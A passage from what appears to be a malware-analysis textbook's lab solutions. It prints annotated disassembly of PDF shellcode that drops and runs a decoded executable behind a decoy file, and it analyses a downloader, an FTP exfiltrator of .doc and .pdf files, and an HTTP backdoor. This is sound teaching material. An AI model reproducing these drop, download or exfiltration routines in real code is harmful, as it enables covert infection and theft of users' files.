<html><head></head><body>
<p class="calibre1">000001E8   push    edx</p>
<p class="calibre1">000001E9   push    dword ptr [ebx+40h] ; File 1 offset E08</p>
<p class="calibre1">000001EC   push    dword ptr [ebp-8]   ; PDF File Handle 000001EF   call    dword ptr [ebx+20h] ; SetFilePointer</p>
<p class="calibre1">000001F2   push    dword ptr [ebx+44h] ; File 1 Size </p>
<p class="calibre1">000001F5   push    dword ptr [ebp-0Ch] ; memory buffer</p>
<p class="calibre1">000001F8   push    dword ptr [ebp-8]   ; PDF File Handle 000001FB   push    dword ptr [ebx+24h] ; ReadFile</p>
<p class="calibre1">000001FE   call    fileIoWrapper </p>
<p class="calibre1"> <i class="calibre4">Listing 19-16L: Reading the first embedded file</i></p>
<p class="calibre1">The code calls SetFilePointer to adjust the location in the malicious PDF </p>
<p class="calibre1">so that it will be based on the value stored at 0x40 in the embedded data, the file offset for the first file to be extracted from the malicious PDF. The shellcode calls a helper function that we’ve named fileIoWrapper at  to read the file contents. Analysis of the function shows that it has the following function prototype:</p>
<p class="calibre1">__stdcall DWORD fileIoWrapper(void* ioFuncPtr, DWORD hFile, char* buffPtr,DWORD bytesToXfer); The first argument to fileIoWrapper is a function pointer to either ReadFile or WriteFile. The shellcode calls the given function pointer in a loop, transferring the entire buffer to or from the given file handle. </p>
<p class="calibre1">Next, the shellcode in Listing 19-17L constructs an output file path, calls GetTempPathA at , and then appends the string foo.exe. </p>
<p class="calibre1">00000203   xor     eax, eax</p>
<p class="calibre1">00000205   lea     edi, [ebp-124h] ; file path buffer</p>
<p class="calibre1">0000020B   mov     ecx, 40h </p>
<p class="calibre1">00000210   rep stosd</p>
<p class="calibre1">00000212   lea     edi, [ebp-124h] ; file path buffer</p>
<p class="calibre1">00000218   push    edi</p>
<p class="calibre1">00000219   push    100h</p>
<p class="calibre1">0000021E   call    dword ptr [ebx+10h] ; GetTempPathA </p>
<p class="calibre1">00000221   xor     eax, eax</p>
<p class="calibre1">00000223   lea     edi, [ebp-124h] ; file path buffer</p>
<p class="calibre1">00000229   repne scasb</p>
<p class="calibre1"><b class="calibre3">1 9</b></p>
<p class="calibre1">0000022B   dec     edi</p>
<p class="calibre1">0000022C   mov     [ebp-1Ch], edi</p>
<p class="calibre1">0000022F   mov     dword ptr [edi], 2E6F6F66h ; "foo." E11</p>
<p class="calibre1">00000235   mov     dword ptr [edi+4], 657865h ; "exe\x00" </p>
<p class="calibre1"> <i class="calibre4">Listing 19-17L: First filename creation for the first output file</i> Solutions to  Labs</p>
<p class="calibre1"><b class="calibre3">709</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p743"/>This extracted file is written to disk using the helper function we’ve named writeBufferToDisk. Analysis shows that this has the following function prototype:</p>
<p class="calibre1">__stdcall void writeBufferToDisk(DWORD* globalStructPtr, char* buffPtr, DWORD </p>
<p class="calibre1">btesToWrite, DWORD maskVal, char* namePtr); </p>
<p class="calibre1">This function will XOR each byte in the input buffer with the value provided in maskVal, and then write the decoded buffer to the filename given by namePtr. The call to writeBufferToDisk at  in Listing 19-18L will use an XOR </p>
<p class="calibre1">mask of 0x4a and write the file to  <i class="calibre4">%TEMP%\foo.exe</i>. This filename is passed to the call to CreateProcessA at , creating a new process from the file just written to disk. </p>
<p class="calibre1">0000023C   mov     ebx, [ebp-14h]</p>
<p class="calibre1">0000023F   lea     eax, [ebp-124h]</p>
<p class="calibre1">00000245   push    eax                 ; output name</p>
<p class="calibre1">00000246   push    4Ah ;               ; xor mask</p>
<p class="calibre1">0000024B   push    dword ptr [ebx+44h] ; File 1 Size</p>
<p class="calibre1">0000024E   push    dword ptr [ebp-0Ch] ; buffer ptr</p>
<p class="calibre1">00000251   push    ebx                 ; globalsPtr</p>
<p class="calibre1">00000252   call    writeBufferToDisk </p>
<p class="calibre1">00000257   xor     eax, eax</p>
<p class="calibre1">00000259   lea     edi, [ebp-178h]</p>
<p class="calibre1">0000025F   mov     ecx, 15h</p>
<p class="calibre1">00000264   rep stosd</p>
<p class="calibre1">00000266   lea     edx, [ebp-178h] ; lpProcessInformation 0000026C   push    edx</p>
<p class="calibre1">0000026D   lea     edx, [ebp-168h] ; lpStartupInfo</p>
<p class="calibre1">00000273   push    edx</p>
<p class="calibre1">00000274   push    eax</p>
<p class="calibre1">00000275   push    eax</p>
<p class="calibre1">00000276   push    eax</p>
<p class="calibre1">00000277   push    0FFFFFFFFh</p>
<p class="calibre1">0000027C   push    eax</p>
<p class="calibre1">0000027D   push    eax</p>
<p class="calibre1">0000027E   push    eax</p>
<p class="calibre1">0000027F   lea     eax, [ebp-124h] </p>
<p class="calibre1">00000285   push    eax</p>
<p class="calibre1">00000286   call    dword ptr [ebx+4] ; CreateProcessA</p>
<p class="calibre1">00000289   push    dword ptr [ebp-0Ch]</p>
<p class="calibre1">0000028C   call    dword ptr [ebx+34h] ; GlobalFree</p>
<p class="calibre1"> <i class="calibre4">Listing 19-18L: Decoding, writing, and launching the first file</i> The shellcode repeats the same procedure in Listing 19-19L for a second file stored encoded within the malicious PDF. It allocates space according to the file size stored at offset 0x4c within the embedded data at , and adjusts the file pointer location using the file offset stored at offset 0x48 at . </p>
<p class="calibre1">0000028F   xor     edx, edx</p>
<p class="calibre1">00000291   mov     ebx, [ebp-14h]</p>
<p class="calibre1"><b class="calibre3">710</b></p>
<p class="calibre1">Appendix C</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p744"/>00000294   push    dword ptr [ebx+4Ch] ; File 2 Size </p>
<p class="calibre1">00000297   push    edx</p>
<p class="calibre1">00000298   call    dword ptr [ebx+30h] ; GlobalAlloc</p>
<p class="calibre1">0000029B   test    eax, eax</p>
<p class="calibre1">0000029D   jz      short loc_313</p>
<p class="calibre1">0000029F   mov     [ebp-10h], eax</p>
<p class="calibre1">000002A2   xor     edx, edx</p>
<p class="calibre1">000002A4   push    edx</p>
<p class="calibre1">000002A5   push    edx</p>
<p class="calibre1">000002A6   push    dword ptr [ebx+48h] ; File 2 Offset </p>
<p class="calibre1">000002A9   push    dword ptr [ebp-8] ; PDF File Handle</p>
<p class="calibre1">000002AC   call    dword ptr [ebx+20h] ; SetFilePointer</p>
<p class="calibre1"> <i class="calibre4">Listing 19-19L: Allocating space for the second file</i> The shellcode in Listing 19-20L uses the same temporary file path as in the first file, but replaces the filename with  <i class="calibre4">bar.pdf</i> at . The call to writeBufferToDisk at  decodes the file contents using the mask value 0x4a, and writes it to  <i class="calibre4">%TEMP%\bar.pdf</i>. </p>
<p class="calibre1">000002AF   push    dword ptr [ebx+4Ch] ; File 2 Size</p>
<p class="calibre1">000002B2   push    dword ptr [ebp-10h] ; memory buffer</p>
<p class="calibre1">000002B5   push    dword ptr [ebp-8] ; PDF File Handle</p>
<p class="calibre1">000002B8   push    dword ptr [ebx+24h] ; ReadFile</p>
<p class="calibre1">000002BB   call    fileIoWrapper</p>
<p class="calibre1">000002C0   mov     eax, [ebp-1Ch]  ; end of Temp Path buffer 000002C3   mov     dword ptr [eax], 2E726162h ; bar. </p>
<p class="calibre1">000002C9   mov     dword ptr [eax+4], 666470h ; pdf\x00</p>
<p class="calibre1">000002D0   lea     eax, [ebp-124h]</p>
<p class="calibre1">000002D6   push    eax             ; output name</p>
<p class="calibre1">000002D7   push    4Ah ;           ; xor mask</p>
<p class="calibre1">000002D9   mov     ebx, [ebp-14h]</p>
<p class="calibre1">000002DC   push    dword ptr [ebx+4Ch] ; File 2 Size</p>
<p class="calibre1">000002DF   push    dword ptr [ebp-10h] ; buffer ptr</p>
<p class="calibre1">000002E2   push    ebx             ; globals ptr</p>
<p class="calibre1">000002E3   call    writeBufferToDisk </p>
<p class="calibre1"> <i class="calibre4">Listing 19-20L: Reading, decoding, and writing the second embedded file</i> Finally, the shellcode in Listing 19-21L opens the PDF file it just wrote to </p>
<p class="calibre1"> <i class="calibre4">%TEMP%\bar.pdf</i> using the call to ShellExecuteA at . It passes in the command string "open" at  and the path to the PDF at , which causes the system to open the specified file with the application registered to handle it. </p>
<p class="calibre1">000002E8   xor     ecx, ecx</p>
<p class="calibre1">000002EA   lea     eax, [ebp-168h] ; scratch space, for ShellExecute lpOperation verb <b class="calibre3">1 9</b></p>
<p class="calibre1">000002F0   mov     dword ptr [eax], 6E65706Fh ; "open" </p>
<p class="calibre1">000002F6   mov     byte ptr [eax+4], 0</p>
<p class="calibre1">000002FA   push    5               ; SW_SHOWNORMAL | SW_SHOWNOACTIVATE</p>
<p class="calibre1">000002FF   push    ecx</p>
<p class="calibre1">00000300   push    ecx</p>
<p class="calibre1">00000301   lea     eax, [ebp-124h] ; output PDF filename </p>
<p class="calibre1">00000307   push    eax</p>
<p class="calibre1">Solutions to  Labs</p>
<p class="calibre1"><b class="calibre3">711</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p745"/>00000308   lea     eax, [ebp-168h] ; ptr to "open" </p>
<p class="calibre1">0000030E   push    eax</p>
<p class="calibre1">0000030F   push    ecx</p>
<p class="calibre1">00000310   call    dword ptr [ebx+38h] ; ShellExecuteA </p>
<p class="calibre1">00000313 loc_313:</p>
<p class="calibre1">00000313   call    dword ptr [ebx+0Ch] ; GetCurrentProcess 00000316   push    0</p>
<p class="calibre1">0000031B   push    eax</p>
<p class="calibre1">0000031C   call    dword ptr [ebx+8] ; TerminateProcess</p>
<p class="calibre1"> <i class="calibre4">Listing 19-21L: Opening the second file and exiting</i></p>
<p class="calibre1">It is common for malicious media files to contain legitimate files that are extracted and opened by the shellcode in an attempt to avoid raising suspicion. The expectation is that users will simply think that any delay is due to a slow computer, when actually the exploit has just launched a new process, and then opened a real file to cover its tracks. </p>
<p class="calibre1"><b class="calibre3">Lab 20-1 Solutions</b></p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Short Answers</b></i></p>
<p class="calibre1">1. </p>
<p class="calibre1">The function at 0x401040 does not take any parameters, but it is passed a reference to an object in ECX that represents the this pointer. </p>
<p class="calibre1">2. </p>
<p class="calibre1">The call to URLDownloadToFile uses  <i class="calibre4">http://www.practicalmalwareanalysis.com/</i></p>
<p class="calibre1"> <i class="calibre4">cpp.html</i> as the URL. </p>
<p class="calibre1">3. </p>
<p class="calibre1">This program downloads a file from a remote server and stores it as <i class="calibre4">c:\tempdownload.exe</i> on the local system. </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Detailed Analysis</b></i></p>
<p class="calibre1">This short lab is intended to demonstrate the usage of the this pointer. The bulk of the main method is shown in Listing 20-1L. </p>
<p class="calibre1">00401006                 push    4</p>
<p class="calibre1">00401008               call    ??2@YAPAXI@Z    ; operator new(uint) 0040100D                 add     esp, 4</p>
<p class="calibre1">00401010               mov     [ebp+var_8], eax</p>
<p class="calibre1">00401013                 mov     eax, [ebp+var_8]</p>
<p class="calibre1">00401016               mov     [ebp+var_4], eax</p>
<p class="calibre1">00401019               mov     ecx, [ebp+var_4]</p>
<p class="calibre1">0040101C                 mov     dword ptr [ecx], offset aHttpWww_practi ; </p>
<p class="calibre1">;0 "http://www.practicalmalwareanalysis.com"... </p>
<p class="calibre1">00401022                 mov     ecx, [ebp+var_4]</p>
<p class="calibre1">00401025                 call    sub_401040</p>
<p class="calibre1"> <i class="calibre4">Listing 20-1L: The main method for </i> Lab20-01.exe The code in Listing 20-1L begins with a call to the new operator at , which tells us that this code is creating an object. A reference to the object is returned in EAX, and is eventually stored in var_8 at  and var_4 at . var_4 </p>
<p class="calibre1"><b class="calibre3">712</b></p>
<p class="calibre1">Appendix C</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p746"/>is moved into ECX at , indicating that it will be passed as the this pointer in a function call. A pointer to the URL  <i class="calibre4">http://www.practicalmalwareanalysis.com/</i></p>
<p class="calibre1"> <i class="calibre4">cpp.html</i> is then stored at the beginning of the object, followed by a call to the function sub_401040, which is shown in Listing 20-2L. </p>
<p class="calibre1">00401043                 push    ecx</p>
<p class="calibre1">00401044               mov     [ebp+var_4], ecx</p>
<p class="calibre1">00401047                 push    0               ; LPBINDSTATUSCALLBACK</p>
<p class="calibre1">00401049                 push    0               ; DWORD</p>
<p class="calibre1">0040104B                 push    offset aCEmpdownload_e ; "c:\tempdownload.exe" </p>
<p class="calibre1">00401050               mov     eax, [ebp+var_4]</p>
<p class="calibre1">00401053               mov     ecx, [eax]</p>
<p class="calibre1">00401055               push    ecx             ; LPCSTR</p>
<p class="calibre1">00401056                 push    0               ; LPUNKNOWN</p>
<p class="calibre1">00401058                 call    URLDownloadToFileA</p>
<p class="calibre1"> <i class="calibre4">Listing 20-2L: Code listing for sub_401040</i></p>
<p class="calibre1">In Listing 20-2L, we see the this pointer in ECX accessed and stored in var_4 at . The remainder of the code is arguments being placed on the stack for the call to URLDownloadToFileA. To obtain the URL that will be used for the function call, the this pointer is accessed at , then the first data element stored in the object is accessed at , and then it’s pushed onto the stack at . </p>
<p class="calibre1">Recall from the main method that the first element stored in the object was the URL string  <i class="calibre4">http://www.practicalmalwareanalysis.com/cpp.html</i>. The main method returns, and the program is finished executing. </p>
<p class="calibre1"><b class="calibre3">Lab 20-2 Solutions</b></p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Short Answers</b></i></p>
<p class="calibre1">1. </p>
<p class="calibre1">The most interesting strings are ftp.practicalmalwareanalysis.com and Home ftp client, which indicate that this program may be FTP client software. </p>
<p class="calibre1">2. </p>
<p class="calibre1">The imports FindFirstFile and FindNextFile indicate that the program probably searches through the victim’s filesystem. The imports InternetOpen, InternetConnect, FtpSetCurrentDirectory, and FtpPutFile tell us that this malware may upload files from the victim machine to a remote FTP server. </p>
<p class="calibre1">3. </p>
<p class="calibre1">The object created at 0x004011D9 represents a  <i class="calibre4">.doc</i> file. It has one virtual function at offset 0x00401440, which uploads the file to a remote FTP </p>
<p class="calibre1">server. </p>
<p class="calibre1">4. </p>
<p class="calibre1">The virtual function call at 0x00401349 will call one of the virtual functions at 0x00401380, 0x00401440, or 0x00401370. </p>
<p class="calibre1">5. </p>
<p class="calibre1">This malware connects to a remote FTP server using high-level API func-20</p>
<p class="calibre1">tions. We could download and set up a local FTP server, and redirect DNS requests to that server in order to fully exercise this malware. </p>
<p class="calibre1">6. </p>
<p class="calibre1">This program searches the victim’s hard drive and uploads all the files with a  <i class="calibre4">.doc</i> or  <i class="calibre4">.pdf</i> extension to a remote FTP server. </p>
<p class="calibre1">Solutions to  Labs</p>
<p class="calibre1"><b class="calibre3">713</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p747"/>7. </p>
<p class="calibre1">The purpose of implementing a virtual function call is to allow the code to execute different upload functions for different file types. </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Detailed Analysis</b></i></p>
<p class="calibre1">First, we look at the program’s strings. The two most interesting strings are Home ftp client and ftp.practicalmalwareanalysis.com. Looking at the imports, we also see FtpPutFile and FtpSetCurrentDirectory. Taken as a whole, the strings and imports strongly suggest that this program is going to connect to an FTP server. </p>
<p class="calibre1">Next, we run this program to perform dynamic analysis. Because of the FTP-related strings, we should set up an FTP server on our malware analysis machine and use ApateDNS to redirect DNS requests to the local machine. </p>
<p class="calibre1">When we run the malware, we see in procmon that the malware is opening files in directories starting with  <i class="calibre4">c:\</i>, and then searching each directory and subdirectory. Looking at the procmon output, we see that the program is mostly opening directories, not individual files, and that it is opening files with  <i class="calibre4">.doc</i> and  <i class="calibre4">.pdf</i> extensions. Where the code opens  <i class="calibre4">.doc</i> and  <i class="calibre4">.pdf</i> files, we also see calls to TCPSend and TCPRecv, which show connections to the local FTP server. If the FTP server you are running has logs, you should be able to see the connections being made, but you won’t see any files that have been successfully uploaded, so let’s load the program into IDA Pro to see what is going on. The program’s main method is relatively short, as shown in Listing 20-3L. </p>
<p class="calibre1">00401500                 push    ebp</p>
<p class="calibre1">00401501                 mov     ebp, esp</p>
<p class="calibre1">00401503                 sub     esp, 198h</p>
<p class="calibre1">00401509                 mov     [ebp+wVersionRequested], 202h 00401512                 lea     eax, [ebp+WSAData]</p>
<p class="calibre1">00401518                 push    eax             ; lpWSAData 00401519                 mov     cx, [ebp+wVersionRequested]</p>
<p class="calibre1">00401520                 push    ecx             ; wVersionRequested 00401521               call    WSAStartup</p>
<p class="calibre1">00401526                 mov     [ebp+var_4], eax</p>
<p class="calibre1">00401529                 push    100h            ; namelen 0040152E               push    offset name     ; name</p>
<p class="calibre1">00401533               call    gethostname</p>
<p class="calibre1">00401538                 push    0               ; int</p>
<p class="calibre1">0040153A                 push    offset FileName ; "C:\\*" </p>
<p class="calibre1">0040153F               call    sub_401000</p>
<p class="calibre1">00401544                 add     esp, 8</p>
<p class="calibre1">00401547                 xor     eax, eax</p>
<p class="calibre1">00401549                 mov     esp, ebp</p>
<p class="calibre1">0040154B                 pop     ebp</p>
<p class="calibre1">0040154C                 retn    10h</p>
<p class="calibre1"> <i class="calibre4">Listing 20-3L: The main method for Lab 20-2</i></p>
<p class="calibre1"><b class="calibre3">714</b></p>
<p class="calibre1">Appendix C</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p748"/>The code starts by calling WSAStartup at  to initialize the Win32 network functions. Next, it calls gethostname at  to retrieve the hostname of the victim. The hostname is stored in a global variable, which IDA Pro has labeled name at . We rename this variable to local_hostname so that we can recognize it when it’s used later in the code. The code then calls sub_401000 </p>
<p class="calibre1">at , which will execute the rest of this malware. Examining sub_401000, we see that it calls FindFirstFile, and it runs in a loop that calls FindNextFile and also calls itself recursively. You should recognize this pattern as a program searching through the filesystem. In the middle of the loop, we see a lot of string-manipulation functions (strcat, strlen, strncmp, and so on), which will find what the program is searching for. A strncmp compares the manipulated string to the characters  <i class="calibre4">.doc</i>. If the filename ends in  <i class="calibre4">.doc</i>, the code in Listing 20-4L is executed. </p>
<p class="calibre1">004011D9                 push    8</p>
<p class="calibre1">004011DB                 call    ??2@YAPAXI@Z    ; operator new(uint) 004011E0                 add     esp, 4</p>
<p class="calibre1">004011E3               mov     [ebp+var_15C], eax</p>
<p class="calibre1">004011E9                 cmp     [ebp+var_15C], 0</p>
<p class="calibre1">004011F0                 jz      short loc_401218</p>
<p class="calibre1">004011F2                 mov     edx, [ebp+var_15C]</p>
<p class="calibre1">004011F8               mov     dword ptr [edx], offset off_4060E0</p>
<p class="calibre1">004011FE                 mov     eax, [ebp+var_15C]</p>
<p class="calibre1">00401204               mov     dword ptr [eax], offset off_4060DC</p>
<p class="calibre1">0040120A                 mov     ecx, [ebp+var_15C]</p>
<p class="calibre1">00401210                 mov     [ebp+var_170], ecx</p>
<p class="calibre1">00401216                 jmp     short loc_401222</p>
<p class="calibre1"> <i class="calibre4">Listing 20-4L: Object creation code if a file ending in </i>.doc <i class="calibre4"> is found. </i></p>
<p class="calibre1">This code creates a new object that represents the file ending in  <i class="calibre4">.doc</i> that has been found. The code first calls the new operator to create an object, and then it starts to initialize the object. The object is stored in var_15C at . Two instructions, at  and , write the virtual function table to the object’s first offset. The first instruction at  is useless to us because it is overwritten by the second mov instruction at . </p>
<p class="calibre1">We know that off_4060DC is a virtual function table because it is being written to an object immediately after creation with the new operator, and if we look at off_4060DC, we see that it stores a pointer to a function at sub_401440. </p>
<p class="calibre1">We’ll label this function docObject_Func1 and analyze it later if we see it called. </p>
<p class="calibre1">If a filename does not end in  <i class="calibre4">.doc</i>, the code checks to see if the filename ends in  <i class="calibre4">.pdf</i>. If so, it creates a different type of object, with a different virtual function table, at offset 0x4060D8. Once the pdf object is created, the code jumps to 0x4012B1, and then to 0x40132F, the same location that is executed after a doc object is created. If the filename does not end in .  <i class="calibre4">pdf</i> or  <i class="calibre4">.doc</i>, then it creates another type of object for all other file types. </p>
<p class="calibre1"><b class="calibre3">20</b></p>
<p class="calibre1">Following the jump where all code paths converge, we see code that moves our object pointer into var_148, and then we see the code in Listing 20-5L. </p>
<p class="calibre1">Solutions to  Labs</p>
<p class="calibre1"><b class="calibre3">715</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p749"/>0040132F                 mov     ecx, [ebp+var_148]</p>
<p class="calibre1">00401335                 mov     edx, [ebp+var_4]</p>
<p class="calibre1">00401338                 mov     [ecx+4], edx</p>
<p class="calibre1">0040133B                 mov     eax, [ebp+var_148]</p>
<p class="calibre1">00401341                 mov     edx, [eax]</p>
<p class="calibre1">00401343                 mov     ecx, [ebp+var_148]</p>
<p class="calibre1">00401349                 call    dword ptr [edx]</p>
<p class="calibre1"> <i class="calibre4">Listing 20-5L: A virtual function call</i></p>
<p class="calibre1">This code references the object stored in var_148, and then calls the first pointer in the virtual function pointer table. This code is the same whether a </p>
<p class="calibre1"> <i class="calibre4">.pdf</i> or  <i class="calibre4">.doc</i> object is created, but the function called differs for different types of objects. </p>
<p class="calibre1">We saw earlier that the code could create one of three different objects:</p>
<p class="calibre1"></p>
<p class="calibre1">An object for  <i class="calibre4">.pdf</i> files, which we’ll call pdfObject. The first function for this object in the virtual function table is at 0x4060D8. </p>
<p class="calibre1"></p>
<p class="calibre1">An object for  <i class="calibre4">.doc</i> files, which we’ll call docObject. The first function in the virtual function table for this object is at 0x4060DC. </p>
<p class="calibre1"></p>
<p class="calibre1">An object for all other files, which we’ll call otherObject. The first function in the virtual function table for this object is at 0x4060E0. </p>
<p class="calibre1">We’ll first check the function to be called for a pdf object. We navigate to the virtual function table at 0x4060D8 and find that the function being called starts at 0x401380. We see that it calls InternetOpen to initialize an Internet connection, and then calls InternetConnect to establish an FTP connection to  <i class="calibre4">ftp.practicalmalwareanalysis.com</i>. Then we see it changes the current directory to  <i class="calibre4">pdfs</i> and uploads the current file to the remote server. We can now rename the function pdfObject_UploadFile. We also look at the function for docObject and see that it executes nearly the same steps, except that it changes the directory to the  <i class="calibre4">docs</i> directory. </p>
<p class="calibre1">Finally, we look at the virtual function table for the otherObject to find the upload function for otherObject at 0x401370. This function does very little, and we can conclude that only  <i class="calibre4">.doc</i> and  <i class="calibre4">.pdf</i> files are uploaded by this malware. </p>
<p class="calibre1">The malware author implemented virtual functions to allow this code to be easily modified or extended in order to add support for different file types simply by implementing a new object and changing the part of the code where the object is created. </p>
<p class="calibre1">To test this code, we can add directories named  <i class="calibre4">docs</i> and  <i class="calibre4">pdfs</i> to our FTP </p>
<p class="calibre1">server, and allow anonymous write access to them. When we rerun our malicious code, we see that it uploads every  <i class="calibre4">.pdf</i> and  <i class="calibre4">.doc</i> file from the victim’s computer to these directories, naming each file with the victim’s hostname and an ID number. </p>
<p class="calibre1"><b class="calibre3">716</b></p>
<p class="calibre1">Appendix C</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p750"/><b class="calibre3">Lab 20-3 Solutions</b></p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Short Answers</b></i></p>
<p class="calibre1">1. </p>
<p class="calibre1">Several strings that look like error messages (Error sending Http post, Error sending Http get, Error reading response, and so on) tell us that this program will be using HTTP GET and POST commands. We also see HTML </p>
<p class="calibre1">paths (/srv.html, /put.html, and so on), which hint at the files that this malware will attempt to open. </p>
<p class="calibre1">2. </p>
<p class="calibre1">Several WS2_32 imports tell us that this program will be communicating over the network. An import to CreateProcess suggests that this program may launch another process. </p>
<p class="calibre1">3. </p>
<p class="calibre1">The function called at 0x4036F0 does not take any parameters other than the string, but ECX contains the this pointer for the object. We know the object that contains the function is an exception object because that object is later used as a parameter to the CxxThrowException functions. </p>
<p class="calibre1">We can tell from the context that the function at 0x4036F0 initializes an exception object, which stores a string that describes what caused the exception. </p>
<p class="calibre1">4. </p>
<p class="calibre1">The six entries of the switch table implement six different backdoor commands: NOOP, sleep, execute a program, download a file, upload a file, and survey the victim. </p>
<p class="calibre1">5. </p>
<p class="calibre1">The program implements a backdoor that uses HTTP as the command channel and has the ability to launch programs, download or upload a file, and collect information about the victim machine. </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Detailed Analysis</b></i></p>
<p class="calibre1">When we look at the program’s strings, we see several that look like error messages, as shown in Listing 20-6L. </p>
<p class="calibre1">Encoding Args Error</p>
<p class="calibre1">Beacon response Error</p>
<p class="calibre1">Caught exception during pollstatus: %s</p>
<p class="calibre1">Polling error</p>
<p class="calibre1">Arg parsing error</p>
<p class="calibre1">Error uploading file</p>
<p class="calibre1">Error downloading file</p>
<p class="calibre1">Error conducting machine survey</p>
<p class="calibre1">Create Process Failed</p>
<p class="calibre1">Failed to gather victim information</p>
<p class="calibre1">Config error</p>
<p class="calibre1">Caught exception in main: %s</p>
<p class="calibre1">Socket Connection Error</p>
<p class="calibre1">Host lookup failed. </p>
<p class="calibre1"><b class="calibre3">20</b></p>
<p class="calibre1">Send Data Error</p>
<p class="calibre1">Solutions to  Labs</p>
<p class="calibre1"><b class="calibre3">717</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p751"/>Error reading response</p>
<p class="calibre1">Error sending Http get</p>
<p class="calibre1">Error sending Http post</p>
<p class="calibre1"> <i class="calibre4">Listing 20-6L: Abbreviated listing of strings from </i> Lab20-03.exe These error messages provide excellent insight into the program’s functionality. These messages tell us that the malware probably does the following:</p>
<p class="calibre1"></p>
<p class="calibre1">Uses HTTP POST and GET commands</p>
<p class="calibre1"></p>
<p class="calibre1">Sends a beacon to a remote machine</p>
<p class="calibre1"></p>
<p class="calibre1">Polls a remote server for some reason (probably for commands to execute)</p>
<p class="calibre1"></p>
<p class="calibre1">Uploads files</p>
<p class="calibre1"></p>
<p class="calibre1">Downloads files</p>
<p class="calibre1"></p>
<p class="calibre1">Creates additional processes</p>
<p class="calibre1"></p>
<p class="calibre1">Conducts a machine survey</p>
<p class="calibre1">With just the information from these strings, we can guess that this program is a backdoor that uses HTTP GET and POST commands for command and control. It looks like the program supports uploading files, downloading files, creating a new process, and surveying the victim’s computer. </p>
<p class="calibre1">When we open the program in IDA Pro, we see that its main method calls a function at 0x403BE0 and then returns. The function at 0x403BE0 contains the main program flow, so we will call it main2. It starts by creating a new object with the new operator and calling a function for the new object with config.dat as an argument to the function, as shown in Listing 20-7L. </p>
<p class="calibre1">00403C03                 push    30h</p>
<p class="calibre1">00403C05                 mov     [ebp+var_4], ebx</p>
<p class="calibre1">00403C08               call    ??2@YAPAXI@Z    ; operator new(uint) 00403C0D               mov     ecx, eax</p>
<p class="calibre1">00403C0F                 add     esp, 4</p>
<p class="calibre1">00403C12                 mov     [ebp+var_14], ecx</p>
<p class="calibre1">00403C15                 cmp     ecx, ebx</p>
<p class="calibre1">00403C17                 mov     byte ptr [ebp+var_4], 1</p>
<p class="calibre1">00403C1B                 jz      short loc_403C2B</p>
<p class="calibre1">00403C1D                 push    offset FileName ; "config.dat" </p>
<p class="calibre1">00403C22               call    sub_401EE0</p>
<p class="calibre1">00403C27                 mov     esi, eax</p>
<p class="calibre1"> <i class="calibre4">Listing 20-7L: An object being created and used in main2</i></p>
<p class="calibre1">IDA Pro labels the new operator at  and returns a pointer to the new object in EAX. A pointer to the object is moved into ECX at , where it is used as the this pointer to the function call at . This tells us that the function sub_401EE0 is a member function of the class of the object created at . </p>
<p class="calibre1">For now, we’ll call this object firstObject. Listing 20-8L shows how it’s used in sub_401EE0. </p>
<p class="calibre1"><b class="calibre3">718</b></p>
<p class="calibre1">Appendix C</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p752"/>00401EF7               mov     esi, ecx 00401EF9                 push    194h</p>
<p class="calibre1">00401EFE               call    ??2@YAPAXI@Z    ; operator new(uint) 00401F03                 add     esp, 4</p>
<p class="calibre1">00401F06                 mov     [esp+14h+var_10], eax</p>
<p class="calibre1">00401F0A                 test    eax, eax</p>
<p class="calibre1">00401F0C                 mov     [esp+14h+var_4], 0</p>
<p class="calibre1">00401F14                 jz      short loc_401F24</p>
<p class="calibre1">00401F16                 mov     ecx, [esp+14h+arg_0]</p>
<p class="calibre1">00401F1A                 push    ecx</p>
<p class="calibre1">00401F1B                 mov     ecx, eax</p>
<p class="calibre1">00401F1D               call    sub_403180</p>
<p class="calibre1"> <i class="calibre4">Listing 20-8L: The first function being called on firstObject</i> sub_401EE0 first stores the pointer to firstObject in ESI at , and then creates another new object at , which we’ll call secondObject. Then it calls a function of the secondObject at . We need to keep analyzing before we can determine the purpose of these objects, so we now look at sub_403180, as shown in Listing 20-9L. </p>
<p class="calibre1">00403199                 push    offset FileName ; "config.dat" </p>
<p class="calibre1">0040319E                 mov     dword ptr [esi], offset off_41015C</p>
<p class="calibre1">004031A4                 mov     byte ptr [esi+18Ch], 4Eh 004031AB               call    ds:CreateFileA</p>
<p class="calibre1">004031B1                 mov     edi, eax</p>
<p class="calibre1">004031B3                 cmp     edi, 0FFFFFFFFh</p>
<p class="calibre1">004031B6               jnz     short loc_4031D5</p>
<p class="calibre1">004031B8                 push    offset aConfigError ; "Config error" </p>
<p class="calibre1">004031BD               lea     ecx, [esp+0BCh+var_AC]</p>
<p class="calibre1">004031C1               call    sub_4036F0</p>
<p class="calibre1">004031C6                 lea     eax, [esp+0B8h+var_AC]</p>
<p class="calibre1">004031CA                 push    offset unk_411560</p>
<p class="calibre1">004031CF               push    eax</p>
